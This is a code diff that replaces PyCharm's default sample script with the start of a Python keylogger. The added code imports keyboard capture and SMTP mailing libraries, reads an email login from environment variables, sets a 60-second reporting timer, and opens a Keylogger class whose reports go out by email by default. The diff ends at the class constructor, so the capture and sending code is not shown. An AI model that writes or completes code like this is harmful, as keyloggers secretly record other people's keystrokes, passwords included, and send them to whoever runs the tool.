@@ -1,16 +1,20 @@
-# This is a sample Python script.
+import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+import os
+from dotenv import load_dotenv
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+load_dotenv()
 
+SEND_RESULTS = 60
+email_address = os.getenv("EMAIL_ADDRESS")
+password = os.getenv("EMAIL_PASSWORD")
 
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
-
-
-# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    print_hi('PyCharm')
-
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
